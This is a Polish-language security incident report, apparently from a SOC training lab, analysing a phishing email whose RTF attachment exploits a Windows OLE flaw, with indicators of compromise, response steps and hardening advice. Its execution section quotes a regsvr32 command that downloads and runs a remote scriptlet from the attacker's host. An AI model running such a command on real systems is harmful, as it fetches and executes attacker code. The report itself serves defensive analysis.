# Raport z Incydentu Bezpieczeństwa: SOC336
**Data raportu:** 2025-02-04  
**Status:** ZAKOŃCZONY (Zagrożenie Krytyczne - RCE)  

---

## 1. Podsumowanie (Executive Summary)
Dnia 4 lutego 2025 r. o godzinie 16:18 wykryto zaawansowany atak typu **Zero-Click Remote Code Execution (RCE)** wykorzystujący podatność w mechanizmie **Windows OLE (CVE-2025-21298)**. Atak został zainicjowany przez złośliwy załącznik `mail.rtf` przesłany do użytkownika **Austin**. Systemy bezpieczeństwa zidentyfikowały złośliwy wzorzec, jednak ze względu na brak restrykcyjnej polityki (Device Action: **Allowed**), doszło do pomyślnego wykonania kodu na stacji roboczej.

---

## 2. Szczegóły Techniczne
| Atrybut | Wartość |
| :--- | :--- |
| **ID Zdarzenia** | 314 (SOC336) |
| **Host / Użytkownik** | Austin (`Austin@letsdefend.io`) |
| **Źródłowy adres IP (SMTP)** | `84.38.130.118` |
| **Adres nadawcy** | `projectmanagement@pm.me` |
| **Załącznik** | `mail.rtf` (Hash: `df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184`) |
| **Domena C2** | `84.38.130.118.com` |

---

## 3. Analiza Przebiegu Ataku (Attack Kill Chain)

### I. Dostarczenie (Initial Access)
Atakujący wykorzystał infrastrukturę o niskiej renomie (`84.38.130.118`) do wysłania wiadomości phishingowej. Wykorzystanie domeny `pm.me` oraz tematu dotyczącego terminów projektowych miało na celu uśpienie czujności filtrów antyspamowych i użytkownika.

### II. Eksploatacja (Exploitation - Zero-Click)
Wykorzystano lukę **CVE-2025-21298**. Dzięki mechanizmowi OLE, złośliwy kod zawarty w pliku RTF uruchomił się automatycznie bez konieczności otwierania załącznika przez użytkownika (wystarczył podgląd wiadomości). Jest to atak o najwyższym stopniu krytyczności.

### III. Wykonanie (Execution - Squiblydoo Technique)
Analiza logów hosta wykazała użycie techniki **Living-off-the-Land** (T1218.010) przy pomocy narzędzia `regsvr32.exe`:
* **Komenda:** `regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll`
* **Działanie:** Narzędzie pobrało złośliwy skrypt COM (`.sct`) z zewnętrznego serwera i wykonało go w pamięci przy pomocy biblioteki `scrobj.dll`. Flaga `/s` zapewniła całkowicie cichy przebieg procesu.

### IV. Ustanowienie C2 (Command & Control)
Proces nawiązał stabilne połączenie z domeną `84.38.130.118.com`, co umożliwiło atakującemu zdalne wydawanie poleceń zainfekowanemu systemowi.

---

## 4. Wskaźniki Kompromitacji (IoC)
* **Adres IP (SMTP):** `84.38.130.118`
* **Domena C2:** `84.38.130.118.com`
* **Hash załącznika:** `df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184`
* **Technika:** Wywołanie `regsvr32.exe` z parametrem HTTP.

---

## 5. Podjęte Działania (Response)
1. **Analiza:** Potwierdzono autentyczność alertu (True Positive) na podstawie logów sieciowych i procesów.
2. **Kwarantanna:** Zaleca się natychmiastową izolację hosta "Austin" od sieci.
3. **Blokada:** Dodano adres IP oraz domenę C2 do czarnej listy na firewallu brzegowym.

---

## 6. Wnioski i Rekomendacje (Lessons Learned)

> [!CAUTION]
> **Brak automatycznej blokady znanego exploita (Device Action: Allowed) sugeruje błąd w konfiguracji systemu bezpieczeństwa poczty.**

* **Aktualizacja systemów:** Niezbędne jest wdrożenie poprawek bezpieczeństwa Windows eliminujących lukę w obsłudze obiektów OLE.
* **Filtrowanie załączników:** Zablokowanie przesyłania plików `.rtf` w komunikacji zewnętrznej.
* **Ograniczenia systemowe:** Wdrożenie polityki AppLocker uniemożliwiającej procesowi `regsvr32.exe` nawiązywanie połączeń z internetem.
* **Automatyzacja SOC:** Skonfigurowanie systemu tak, aby przy wykryciu znanego wzorca exploit (CVE) akcja była automatycznie zmieniana na **Block/Quarantine**.
